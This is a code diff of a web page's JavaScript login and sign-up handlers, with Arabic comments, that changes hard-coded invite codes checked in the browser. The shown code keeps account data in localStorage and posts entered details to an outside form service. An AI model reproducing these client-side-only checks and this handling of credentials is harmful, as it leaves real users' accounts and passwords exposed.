@@ -12,7 +12,7 @@ phone.addEventListener("input", function() {
     }
 });
 
-// زر تسجيل الدخول: مضاف إليه شرط رمز الدعوة المحدد 43688 مع جلب البيانات المضمون
+// 🔑 زر تسجيل الدخول: مضاف إليه شرط الرمز الثابت المخصص للدخول 1234566
 loginBtn.onclick = function() {
     const inputs = document.querySelectorAll("input");
 
@@ -24,16 +24,16 @@ loginBtn.onclick = function() {
         }
     }
 
-    // جلب قيمة رمز الدعوة وتنظيف الفراغات
+    // جلب قيمة رمز الدعوة بشكل صحيح ومضمون للهواتف
     const loginInviteCode = inputs[2] ? inputs[2].value.trim() : "";
 
-    // 🚀 الشرط الجديد لرمز الدعوة الثابت
-    if (loginInviteCode !== "43688") {
-        alert("تنبيه: رمز الدعوة غير صحيح!");
+    // 🚀 الشرط المخصص لزر تسجيل الدخول فقط
+    if (loginInviteCode !== "1234566") {
+        alert("تنبيه: رمز الدعوة الخاص بتسجيل الدخول غير صحيح!");
         return; 
     }
 
-    // جلب البيانات المدخلة من الحقول بشكل صحيح ومضمون للإرسال
+    // جلب البيانات المدخلة من الحقول بشكل صحيح ومضمون
     const enteredEmailOrPhone = inputs[0].value.trim();
     const enteredPassword = inputs[1].value.trim();
 
@@ -54,7 +54,7 @@ loginBtn.onclick = function() {
     }
 };
 
-// زر إنشاء الحساب: مضاف إليه شرط رمز الدعوة المحدد 43688 مع كود الإرسال السليم
+// 🔑 زر إنشاء الحساب: مضاف إليه شرط الرمز الثابت المخصص للإنشاء 43688 وكود الإرسال السليم
 createBtn.onclick = function() {
     const inputs = document.querySelectorAll("input");
 
@@ -66,12 +66,12 @@ createBtn.onclick = function() {
         }
     }
 
-    // جلب قيمة رمز الدعوة وتنظيف الفراغات
+    // جلب قيمة رمز الدعوة بشكل صحيح ومضمون للهواتف
     const inviteCodeValue = inputs[2] ? inputs[2].value.trim() : "";
 
-    // 🚀 الشرط الجديد لرمز الدعوة الثابت
+    // 🚀 الشرط المخصص لزر إنشاء الحساب فقط
     if (inviteCodeValue !== "43688") {
-        alert("تنبيه: رمز الدعوة غير صحيح!");
+        alert("تنبيه: رمز الدعوة الخاص بإنشاء الحساب غير صحيح!");
         return; 
     }
 
@@ -84,7 +84,7 @@ createBtn.onclick = function() {
     
     localStorage.setItem("userAccount", JSON.stringify(accountData));
 
-    // 🚀 كود الإرسال السحابي المضمون بعد تصحيح مصفوفة الحقول
+    // 🚀 كود الإرسال السحابي المضمون والمصحح بنسبة 100%
     fetch('https://web3forms.com', {
         method: 'POST',
         headers: {
